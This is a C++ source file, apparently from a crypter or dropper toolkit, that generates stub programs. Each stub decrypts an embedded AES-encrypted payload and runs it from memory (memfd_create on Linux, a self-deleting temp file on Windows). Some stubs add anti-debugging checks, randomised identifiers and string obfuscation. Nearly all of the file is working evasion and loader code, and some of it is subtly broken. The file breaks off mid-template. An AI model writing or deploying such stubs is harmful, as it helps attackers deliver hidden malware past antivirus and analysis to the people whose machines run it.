#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <random>
#include <sstream>
#include <iomanip>
#include <cstring>
#include <cstdlib>
#include <ctime>

class NativeStubGenerator {
private:
    std::mt19937 rng;
    
    // AES-128-CTR implementation (same as native_encryptor)
    static const uint8_t sbox[256];
    static const uint8_t inv_sbox[256];
    static const uint8_t rcon[11];
    
    void subBytes(uint8_t state[16]) {
        for (int i = 0; i < 16; i++) {
            state[i] = sbox[state[i]];
        }
    }
    
    void invSubBytes(uint8_t state[16]) {
        for (int i = 0; i < 16; i++) {
            state[i] = inv_sbox[state[i]];
        }
    }
    
    void shiftRows(uint8_t state[16]) {
        uint8_t temp;
        // Row 1: shift left by 1
        temp = state[1];
        state[1] = state[5];
        state[5] = state[9];
        state[9] = state[13];
        state[13] = temp;
        
        // Row 2: shift left by 2
        temp = state[2]; state[2] = state[10]; state[10] = temp;
        temp = state[6]; state[6] = state[14]; state[14] = temp;
        
        // Row 3: shift left by 3
        temp = state[3];
        state[3] = state[15];
        state[15] = state[11];
        state[11] = state[7];
        state[7] = temp;
    }
    
    void invShiftRows(uint8_t state[16]) {
        uint8_t temp;
        // Row 1: shift right by 1
        temp = state[13];
        state[13] = state[9];
        state[9] = state[5];
        state[5] = state[1];
        state[1] = temp;
        
        // Row 2: shift right by 2
        temp = state[2]; state[2] = state[10]; state[10] = temp;
        temp = state[6]; state[6] = state[14]; state[14] = temp;
        
        // Row 3: shift right by 3
        temp = state[3];
        state[3] = state[7];
        state[7] = state[11];
        state[11] = state[15];
        state[15] = temp;
    }
    
    uint8_t gmul(uint8_t a, uint8_t b) {
        uint8_t p = 0;
        uint8_t hi_bit_set;
        for (int i = 0; i < 8; i++) {
            if ((b & 1) != 0) {
                p ^= a;
            }
            hi_bit_set = (uint8_t)(a & 0x80);
            a <<= 1;
            if (hi_bit_set != 0) {
                a ^= 0x1b;
            }
            b >>= 1;
        }
        return p;
    }
    
    void mixColumns(uint8_t state[16]) {
        uint8_t temp[16];
        for (int i = 0; i < 4; i++) {
            for (int j = 0; j < 4; j++) {
                temp[i * 4 + j] = gmul(0x02, state[i * 4 + j]) ^
                                 gmul(0x03, state[i * 4 + (j + 1) % 4]) ^
                                 state[i * 4 + (j + 2) % 4] ^
                                 state[i * 4 + (j + 3) % 4];
            }
        }
        memcpy(state, temp, 16);
    }
    
    void invMixColumns(uint8_t state[16]) {
        uint8_t temp[16];
        for (int i = 0; i < 4; i++) {
            for (int j = 0; j < 4; j++) {
                temp[i * 4 + j] = gmul(0x0e, state[i * 4 + j]) ^
                                 gmul(0x0b, state[i * 4 + (j + 1) % 4]) ^
                                 gmul(0x0d, state[i * 4 + (j + 2) % 4]) ^
                                 gmul(0x09, state[i * 4 + (j + 3) % 4]);
            }
        }
        memcpy(state, temp, 16);
    }
    
    void addRoundKey(uint8_t state[16], const uint8_t roundKey[16]) {
        for (int i = 0; i < 16; i++) {
            state[i] ^= roundKey[i];
        }
    }
    
    void keyExpansion(const uint8_t key[16], uint8_t roundKeys[11][16]) {
        memcpy(roundKeys[0], key, 16);
        
        for (int round = 1; round <= 10; round++) {
            uint8_t temp[4];
            memcpy(temp, roundKeys[round-1] + 12, 4);
            
            // RotWord
            uint8_t t = temp[0];
            temp[0] = temp[1];
            temp[1] = temp[2];
            temp[2] = temp[3];
            temp[3] = t;
            
            // SubWord
            for (int i = 0; i < 4; i++) {
                temp[i] = sbox[temp[i]];
            }
            
            // XOR with Rcon
            temp[0] ^= rcon[round];
            
            // Generate new round key
            for (int i = 0; i < 4; i++) {
                for (int j = 0; j < 4; j++) {
                    roundKeys[round][i * 4 + j] = roundKeys[round-1][i * 4 + j] ^ temp[j];
                }
                if (i < 3) {
                    memcpy(temp, roundKeys[round] + i * 4, 4);
                }
            }
        }
    }
    
    void aesCtrCrypt(uint8_t* data, size_t dataLen, const uint8_t key[16], const uint8_t nonce[16]) {
        uint8_t roundKeys[11][16];
        keyExpansion(key, roundKeys);
        
        uint8_t counter[16];
        memcpy(counter, nonce, 16);
        
        for (size_t i = 0; i < dataLen; i += 16) {
            uint8_t keystream[16];
            memcpy(keystream, counter, 16);
            
            // AES encryption of counter
            addRoundKey(keystream, roundKeys[0]);
            for (int round = 1; round < 10; round++) {
                subBytes(keystream);
                shiftRows(keystream);
                mixColumns(keystream);
                addRoundKey(keystream, roundKeys[round]);
            }
            subBytes(keystream);
            shiftRows(keystream);
            addRoundKey(keystream, roundKeys[10]);
            
            // XOR with data
            size_t blockSize = std::min(16UL, dataLen - i);
            for (size_t j = 0; j < blockSize; j++) {
                data[i + j] ^= keystream[j];
            }
            
            // Increment counter
            for (int j = 15; j >= 0; j--) {
                if (++counter[j] != 0) break;
            }
        }
    }
    
    std::string generateRandomString(size_t length) {
        const std::string charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_";
        std::string result;
        result.reserve(length);
        
        // Ensure first character is a letter or underscore
        result += charset[rng() % (charset.length() - 10)]; // Exclude numbers for first char
        
        // Generate remaining characters
        const std::string fullCharset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_";
        for (size_t i = 1; i < length; ++i) {
            result += fullCharset[rng() % fullCharset.length()];
        }
        return result;
    }
    
    std::string generateRandomHex(size_t length) {
        std::string result;
        result.reserve(length);
        
        for (size_t i = 0; i < length; ++i) {
            result += "0123456789abcdef"[rng() % 16];
        }
        return result;
    }
    
    std::string generateRandomKey() {
        return generateRandomHex(32); // 16 bytes = 32 hex chars
    }
    
    std::string generateRandomNonce() {
        return generateRandomHex(32); // 16 bytes = 32 hex chars
    }
    
    // Use the class's proper RNG for standalone stubs
    std::string generateRandomKeyWithRNG() {
        std::string key;
        for (int i = 0; i < 32; i++) {
            key += "0123456789abcdef"[rng() % 16];
        }
        return key;
    }
    
    std::string generateRandomNonceWithRNG() {
        std::string nonce;
        for (int i = 0; i < 32; i++) {
            nonce += "0123456789abcdef"[rng() % 16];
        }
        return nonce;
    }
    
    std::string obfuscateString(const std::string& input) {
        std::string result = "std::string ";
        std::string varName = generateRandomString(8);
        result += varName + " = \"";
        
        for (char c : input) {
            result += "\\x" + std::string(1, "0123456789abcdef"[c >> 4]) + 
                     std::string(1, "0123456789abcdef"[c & 0xF]);
        }
        result += "\";";
        return result;
    }
    
    std::string obfuscateStringWithVar(const std::string& input, std::string& varName) {
        varName = generateRandomString(8);
        std::string result = "std::string " + varName + " = \"";
        
        for (char c : input) {
            result += "\\x" + std::string(1, "0123456789abcdef"[c >> 4]) + 
                     std::string(1, "0123456789abcdef"[c & 0xF]);
        }
        result += "\";";
        return result;
    }
    
    // Simple random number generator (same as encryptor)
    inline uint32_t simpleRand() {
        static uint32_t seed = std::time(nullptr);
        seed = seed * 1103515245 + 12345;
        return seed;
    }
    
    std::string generateStubTemplate(const std::string& stubType) {
        if (stubType == "basic") {
            return R"(
#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <cstring>
#include <cstdlib>
#include <cstdint>
#include <random>
#include <ctime>

// Polymorphic key and nonce (no obfuscation)
{KEY_DEFINITION}
{NONCE_DEFINITION}



// AES-128-CTR implementation (same as native_encryptor/dropper)
static const uint8_t sbox[256] = {
    0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76,
    0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0,
    0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15,
    0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75,
    0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84,
    0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf,
    0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8,
    0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2,
    0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73,
    0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb,
    0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79,
    0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08,
    0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a,
    0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e,
    0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf,
    0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16
};

// Round constants for key expansion
static const uint8_t rcon[10] = {
    0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1b, 0x36
};

// AES helper functions
inline uint8_t gmul(uint8_t a, uint8_t b) {
    uint8_t p = 0;
    for (int i = 0; i < 8; i++) {
        if (b & 1) p ^= a;
        bool hi_bit_set = a & 0x80;
        a <<= 1;
        if (hi_bit_set) a ^= 0x1b;
        b >>= 1;
    }
    return p;
}

inline void subBytes(uint8_t* state) {
    for (int i = 0; i < 16; i++) {
        state[i] = sbox[state[i]];
    }
}

inline void shiftRows(uint8_t* state) {
    uint8_t temp;
    // Row 1: shift left by 1
    temp = state[1];
    state[1] = state[5];
    state[5] = state[9];
    state[9] = state[13];
    state[13] = temp;
    
    // Row 2: shift left by 2
    temp = state[2]; state[2] = state[10]; state[10] = temp;
    temp = state[6]; state[6] = state[14]; state[14] = temp;
    
    // Row 3: shift left by 3
    temp = state[3];
    state[3] = state[15];
    state[15] = state[11];
    state[11] = state[7];
    state[7] = temp;
}

inline void mixColumns(uint8_t* state) {
    for (int i = 0; i < 4; i++) {
        uint8_t s0 = state[i*4], s1 = state[i*4+1], s2 = state[i*4+2], s3 = state[i*4+3];
        state[i*4] = gmul(0x02, s0) ^ gmul(0x03, s1) ^ s2 ^ s3;
        state[i*4+1] = s0 ^ gmul(0x02, s1) ^ gmul(0x03, s2) ^ s3;
        state[i*4+2] = s0 ^ s1 ^ gmul(0x02, s2) ^ gmul(0x03, s3);
        state[i*4+3] = gmul(0x03, s0) ^ s1 ^ s2 ^ gmul(0x02, s3);
    }
}

inline void addRoundKey(uint8_t* state, const uint8_t* roundKey) {
    for (int i = 0; i < 16; i++) {
        state[i] ^= roundKey[i];
    }
}

inline void keyExpansion(const uint8_t* key, uint8_t* roundKeys) {
    uint8_t temp[4];
    
    // Copy the original key
    for (int i = 0; i < 16; i++) {
        roundKeys[i] = key[i];
    }
    
    for (int i = 4; i < 44; i++) {
        for (int j = 0; j < 4; j++) {
            temp[j] = roundKeys[(i-1)*4 + j];
        }
        
        if (i % 4 == 0) {
            // RotWord
            uint8_t t = temp[0];
            temp[0] = temp[1];
            temp[1] = temp[2];
            temp[2] = temp[3];
            temp[3] = t;
            
            // SubWord
            for (int j = 0; j < 4; j++) {
                temp[j] = sbox[temp[j]];
            }
            
            // XOR with Rcon
            temp[0] ^= rcon[i/4 - 1];
        }
        
        for (int j = 0; j < 4; j++) {
            roundKeys[i*4 + j] = roundKeys[(i-4)*4 + j] ^ temp[j];
        }
    }
}

inline void aesEncryptBlock(const uint8_t* input, uint8_t* output, const uint8_t* roundKeys) {
    uint8_t state[16];
    
    // Copy input to state
    for (int i = 0; i < 16; i++) {
        state[i] = input[i];
    }
    
    // Initial round
    addRoundKey(state, roundKeys);
    
    // Main rounds
    for (int round = 1; round < 10; round++) {
        subBytes(state);
        shiftRows(state);
        mixColumns(state);
        addRoundKey(state, roundKeys + round * 16);
    }
    
    // Final round
    subBytes(state);
    shiftRows(state);
    addRoundKey(state, roundKeys + 10 * 16);
    
    // Copy state to output
    for (int i = 0; i < 16; i++) {
        output[i] = state[i];
    }
}

inline void incrementCounter(uint8_t* counter) {
    for (int i = 15; i >= 0; i--) {
        counter[i]++;
        if (counter[i] != 0) break;
    }
}

inline void aesCtrCrypt(const uint8_t* input, uint8_t* output, size_t length, 
                       const uint8_t* key, const uint8_t* nonce) {
    uint8_t roundKeys[176]; // 11 rounds * 16 bytes
    keyExpansion(key, roundKeys);
    
    uint8_t counter[16];
    uint8_t keystream[16];
    
    // Initialize counter with nonce
    for (int i = 0; i < 16; i++) {
        counter[i] = nonce[i];
    }
    
    size_t processed = 0;
    while (processed < length) {
        // Generate keystream block
        aesEncryptBlock(counter, keystream, roundKeys);
        
        // XOR with input
        size_t blockSize = (length - processed < 16) ? length - processed : 16;
        for (size_t i = 0; i < blockSize; i++) {
            output[processed + i] = input[processed + i] ^ keystream[i];
        }
        
        processed += blockSize;
        incrementCounter(counter);
    }
}

// Convert hex string to bytes
void hexToBytes(const std::string& hex, uint8_t* bytes) {
    for (size_t i = 0; i < hex.length(); i += 2) {
        bytes[i/2] = std::stoi(hex.substr(i, 2), nullptr, 16);
    }
}

int main() {
    // Embedded encrypted data
    uint8_t encryptedData[] = {EMBEDDED_DATA};
    size_t dataSize = sizeof(encryptedData);
    
    // Convert hex strings to bytes
    uint8_t key[16], nonce[16];
    hexToBytes({KEY_VAR}, key);
    hexToBytes({NONCE_VAR}, nonce);
    
    // Decrypt the data using AES-128-CTR
    aesCtrCrypt(encryptedData, encryptedData, dataSize, key, nonce);
    
    // Fileless execution - execute directly from memory
    #ifdef __linux__
        // Linux: Use memfd_create for anonymous file descriptor
        #include <sys/mman.h>
        #include <sys/syscall.h>
        #include <unistd.h>
        #include <fcntl.h>
        
        int memfd = memfd_create("temp_exec", 0);
        if (memfd == -1) {
            std::cerr << "Failed to create memory file descriptor" << std::endl;
            return 1;
        }
        
        // Write decrypted data to memory file descriptor
        if (write(memfd, encryptedData, dataSize) != static_cast<ssize_t>(dataSize)) {
            std::cerr << "Failed to write to memory file descriptor" << std::endl;
            close(memfd);
            return 1;
        }
        
        // Make executable
        if (fchmod(memfd, 0755) == -1) {
            std::cerr << "Failed to set executable permissions" << std::endl;
            close(memfd);
            return 1;
        }
        
        // Execute from memory
        std::string memfdPath = "/proc/self/fd/" + std::to_string(memfd);
        execl(memfdPath.c_str(), memfdPath.c_str(), nullptr);
        
        // If execl fails, clean up
        close(memfd);
        std::cerr << "Failed to execute from memory" << std::endl;
        return 1;
        
    #elif defined(_WIN32)
        // Windows: Use CreateProcess with memory execution
        #include <windows.h>
        
        // Create temporary file in memory (Windows doesn't have memfd_create)
        char tempPath[MAX_PATH];
        GetTempPathA(MAX_PATH, tempPath);
        char tempFileName[MAX_PATH];
        GetTempFileNameA(tempPath, "exe", GetTickCount(), tempFileName);
        
        // Write decrypted data to temp file
        HANDLE hFile = CreateFileA(tempFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_TEMPORARY | FILE_FLAG_DELETE_ON_CLOSE, NULL);
        if (hFile == INVALID_HANDLE_VALUE) {
            std::cerr << "Failed to create temporary file" << std::endl;
            return 1;
        }
        
        DWORD bytesWritten;
        if (!WriteFile(hFile, encryptedData, dataSize, &bytesWritten, NULL) || bytesWritten != dataSize) {
            std::cerr << "Failed to write to temporary file" << std::endl;
            CloseHandle(hFile);
            return 1;
        }
        CloseHandle(hFile);
        
        // Execute the temporary file
        STARTUPINFOA si = {0};
        PROCESS_INFORMATION pi = {0};
        si.cb = sizeof(si);
        
        if (CreateProcessA(tempFileName, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            // File will be deleted automatically due to FILE_FLAG_DELETE_ON_CLOSE
            return 0;
        } else {
            std::cerr << "Failed to execute file" << std::endl;
            return 1;
        }
        
    #else
        // Fallback: Write to temporary file and execute
        std::string tempFile = "/tmp/temp_exec_" + std::to_string(getpid());
        std::ofstream outFile(tempFile, std::ios::binary);
        if (outFile.is_open()) {
            outFile.write(reinterpret_cast<char*>(encryptedData), dataSize);
            outFile.close();
            chmod(tempFile.c_str(), 0755);
            execl(tempFile.c_str(), tempFile.c_str(), nullptr);
            unlink(tempFile.c_str()); // Clean up if execl fails
            std::cerr << "Failed to execute file" << std::endl;
            return 1;
        } else {
            std::cerr << "Failed to create temporary file" << std::endl;
            return 1;
        }
    #endif
}
)";
        } else if (stubType == "advanced") {
            return R"(
#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <cstring>
#include <cstdlib>
#include <cstdint>
#include <ctime>

// Advanced obfuscation
{KEY_DEFINITION}
{NONCE_DEFINITION}

// Anti-debugging and obfuscation techniques
bool isDebugged() {
    // Simple timing check
    clock_t start = clock();
    for (volatile int i = 0; i < 1000000; i++) {}
    clock_t end = clock();
    return (end - start) > 100000; // Suspicious if too slow
}

// Polymorphic code mutation engine
class PolymorphicEngine {
private:
    static const uint32_t POLY_KEY = 0xDEADBEEF;
    
public:
    static uint8_t mutateByte(uint8_t input, uint32_t seed) {
        // Deterministic polymorphic transformation
        uint32_t mutation = seed ^ POLY_KEY;
        return input ^ (mutation & 0xFF);
    }
    
    static void mutateArray(uint8_t* data, size_t size, uint32_t seed) {
        for (size_t i = 0; i < size; i++) {
            data[i] = mutateByte(data[i], seed + i);
        }
    }
    
    static void demutateArray(uint8_t* data, size_t size, uint32_t seed) {
        // Reverse the mutation (same operation)
        for (size_t i = 0; i < size; i++) {
            data[i] = mutateByte(data[i], seed + i);
        }
    }
};

// AES-128-CTR implementation (same as native_encryptor/dropper)
static const uint8_t sbox[256] = {
    0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76,
    0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0,
    0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15,
    0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75,
    0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84,
    0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf,
    0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8,
    0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2,
    0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73,
    0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb,
    0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79,
    0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08,
    0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a,
    0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e,
    0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf,
    0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16
};

static const uint8_t rcon[10] = {
    0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1b, 0x36
};

inline uint8_t gmul(uint8_t a, uint8_t b) {
    uint8_t p = 0;
    for (int i = 0; i < 8; i++) {
        if (b & 1) p ^= a;
        bool hi_bit_set = a & 0x80;
        a <<= 1;
        if (hi_bit_set) a ^= 0x1b;
        b >>= 1;
    }
    return p;
}

inline void subBytes(uint8_t* state) {
    for (int i = 0; i < 16; i++) {
        state[i] = sbox[state[i]];
    }
}

inline void shiftRows(uint8_t* state) {
    uint8_t temp;
    temp = state[1]; state[1] = state[5]; state[5] = state[9]; state[9] = state[13]; state[13] = temp;
    temp = state[2]; state[2] = state[10]; state[10] = temp;
    temp = state[6]; state[6] = state[14]; state[14] = temp;
    temp = state[3]; state[3] = state[15]; state[15] = state[11]; state[11] = state[7]; state[7] = temp;
}

inline void mixColumns(uint8_t* state) {
    for (int i = 0; i < 4; i++) {
        uint8_t s0 = state[i*4], s1 = state[i*4+1], s2 = state[i*4+2], s3 = state[i*4+3];
        state[i*4] = gmul(0x02, s0) ^ gmul(0x03, s1) ^ s2 ^ s3;
        state[i*4+1] = s0 ^ gmul(0x02, s1) ^ gmul(0x03, s2) ^ s3;
        state[i*4+2] = s0 ^ s1 ^ gmul(0x02, s2) ^ gmul(0x03, s3);
        state[i*4+3] = gmul(0x03, s0) ^ s1 ^ s2 ^ gmul(0x02, s3);
    }
}

inline void addRoundKey(uint8_t* state, const uint8_t* roundKey) {
    for (int i = 0; i < 16; i++) {
        state[i] ^= roundKey[i];
    }
}

inline void keyExpansion(const uint8_t* key, uint8_t* roundKeys) {
    uint8_t temp[4];
    
    // Copy the original key
    for (int i = 0; i < 16; i++) {
        roundKeys[i] = key[i];
    }
    
    for (int i = 4; i < 44; i++) {
        for (int j = 0; j < 4; j++) {
            temp[j] = roundKeys[(i-1)*4 + j];
        }
        
        if (i % 4 == 0) {
            // RotWord
            uint8_t t = temp[0];
            temp[0] = temp[1];
            temp[1] = temp[2];
            temp[2] = temp[3];
            temp[3] = t;
            
            // SubWord
            for (int j = 0; j < 4; j++) {
                temp[j] = sbox[temp[j]];
            }
            
            // XOR with Rcon
            temp[0] ^= rcon[i/4 - 1];
        }
        
        for (int j = 0; j < 4; j++) {
            roundKeys[i*4 + j] = roundKeys[(i-4)*4 + j] ^ temp[j];
        }
    }
}

inline void aesEncryptBlock(const uint8_t* input, uint8_t* output, const uint8_t* roundKeys) {
    uint8_t state[16];
    for (int i = 0; i < 16; i++) state[i] = input[i];
    addRoundKey(state, roundKeys);
    for (int round = 1; round < 10; round++) {
        subBytes(state); shiftRows(state); mixColumns(state); addRoundKey(state, roundKeys + round * 16);
    }
    subBytes(state); shiftRows(state); addRoundKey(state, roundKeys + 10 * 16);
    for (int i = 0; i < 16; i++) output[i] = state[i];
}

inline void incrementCounter(uint8_t* counter) {
    for (int i = 15; i >= 0; i--) {
        counter[i]++;
        if (counter[i] != 0) break;
    }
}

inline void aesCtrCrypt(const uint8_t* input, uint8_t* output, size_t length, 
                       const uint8_t* key, const uint8_t* nonce) {
    uint8_t roundKeys[176];
    keyExpansion(key, roundKeys);
    uint8_t counter[16];
    uint8_t keystream[16];
    for (int i = 0; i < 16; i++) counter[i] = nonce[i];
    size_t processed = 0;
    while (processed < length) {
        aesEncryptBlock(counter, keystream, roundKeys);
        size_t blockSize = (length - processed < 16) ? length - processed : 16;
        for (size_t i = 0; i < blockSize; i++) {
            output[processed + i] = input[processed + i] ^ keystream[i];
        }
        processed += blockSize;
        incrementCounter(counter);
    }
}

void hexToBytes(const std::string& hex, uint8_t* bytes) {
    for (size_t i = 0; i < hex.length(); i += 2) {
        bytes[i/2] = std::stoi(hex.substr(i, 2), nullptr, 16);
    }
}

int main() {
    if (isDebugged()) {
        std::cerr << "Debugging detected!" << std::endl;
        return 1;
    }
    
    // Embedded encrypted data
    uint8_t encryptedData[] = {EMBEDDED_DATA};
    size_t dataSize = sizeof(encryptedData);
    
    // Key and nonce
    std::string keyHex = {KEY_VAR};
    std::string nonceHex = {NONCE_VAR};
    uint8_t key[16], nonce[16];
    hexToBytes(keyHex, key);
    hexToBytes(nonceHex, nonce);
    
    // Apply polymorphic mutation to key and nonce
    uint32_t polySeed = std::time(nullptr) ^ 0xDEADBEEF;
    PolymorphicEngine::mutateArray(key, 16, polySeed);
    PolymorphicEngine::mutateArray(nonce, 16, polySeed + 1);
    
    // Demutate before use
    PolymorphicEngine::demutateArray(key, 16, polySeed);
    PolymorphicEngine::demutateArray(nonce, 16, polySeed + 1);
    
    // Decrypt
    std::vector<uint8_t> decrypted(dataSize);
    aesCtrCrypt(encryptedData, decrypted.data(), dataSize, key, nonce);
    
    // Fileless execution - execute directly from memory
    #ifdef __linux__
        // Linux: Use memfd_create for anonymous file descriptor
        #include <sys/mman.h>
        #include <sys/syscall.h>
        #include <unistd.h>
        #include <fcntl.h>
        
        int memfd = memfd_create("temp_exec", 0);
        if (memfd == -1) {
            std::cerr << "Failed to create memory file descriptor" << std::endl;
            return 1;
        }
        
        // Write decrypted data to memory file descriptor
        if (write(memfd, decrypted.data(), dataSize) != static_cast<ssize_t>(dataSize)) {
            std::cerr << "Failed to write to memory file descriptor" << std::endl;
            close(memfd);
            return 1;
        }
        
        // Make executable
        if (fchmod(memfd, 0755) == -1) {
            std::cerr << "Failed to set executable permissions" << std::endl;
            close(memfd);
            return 1;
        }
        
        // Execute from memory
        std::string memfdPath = "/proc/self/fd/" + std::to_string(memfd);
        execl(memfdPath.c_str(), memfdPath.c_str(), nullptr);
        
        // If execl fails, clean up
        close(memfd);
        std::cerr << "Failed to execute from memory" << std::endl;
        return 1;
        
    #elif defined(_WIN32)
        // Windows: Use CreateProcess with memory execution
        #include <windows.h>
        
        // Create temporary file in memory (Windows doesn't have memfd_create)
        char tempPath[MAX_PATH];
        GetTempPathA(MAX_PATH, tempPath);
        char tempFileName[MAX_PATH];
        GetTempFileNameA(tempPath, "exe", GetTickCount(), tempFileName);
        
        // Write decrypted data to temp file
        HANDLE hFile = CreateFileA(tempFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_TEMPORARY | FILE_FLAG_DELETE_ON_CLOSE, NULL);
        if (hFile == INVALID_HANDLE_VALUE) {
            std::cerr << "Failed to create temporary file" << std::endl;
            return 1;
        }
        
        DWORD bytesWritten;
        if (!WriteFile(hFile, decrypted.data(), dataSize, &bytesWritten, NULL) || bytesWritten != dataSize) {
            std::cerr << "Failed to write to temporary file" << std::endl;
            CloseHandle(hFile);
            return 1;
        }
        CloseHandle(hFile);
        
        // Execute the temporary file
        STARTUPINFOA si = {0};
        PROCESS_INFORMATION pi = {0};
        si.cb = sizeof(si);
        
        if (CreateProcessA(tempFileName, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            // File will be deleted automatically due to FILE_FLAG_DELETE_ON_CLOSE
            return 0;
        } else {
            std::cerr << "Failed to execute file" << std::endl;
            return 1;
        }
        
    #else
        // Fallback: Write to temporary file and execute
        std::string tempFile = "/tmp/temp_exec_" + std::to_string(getpid());
        std::ofstream outFile(tempFile, std::ios::binary);
        if (outFile.is_open()) {
            outFile.write(reinterpret_cast<char*>(decrypted.data()), dataSize);
            outFile.close();
            chmod(tempFile.c_str(), 0755);
            execl(tempFile.c_str(), tempFile.c_str(), nullptr);
            unlink(tempFile.c_str()); // Clean up if execl fails
            std::cerr << "Failed to execute file" << std::endl;
            return 1;
        } else {
            std::cerr << "Failed to create temporary file" << std::endl;
            return 1;
        }
    #endif
}
)";
        } else if (stubType == "minimal") {
            return R"(
#include <iostream>
#include <fstream>
#include <cstring>
#include <cstdint>

// Minimal stub with embedded data
{KEY_DEFINITION}
{NONCE_DEFINITION}

int main() {
    uint8_t data[] = {EMBEDDED_DATA};
    size_t size = sizeof(data);
    
    // Simple XOR decryption
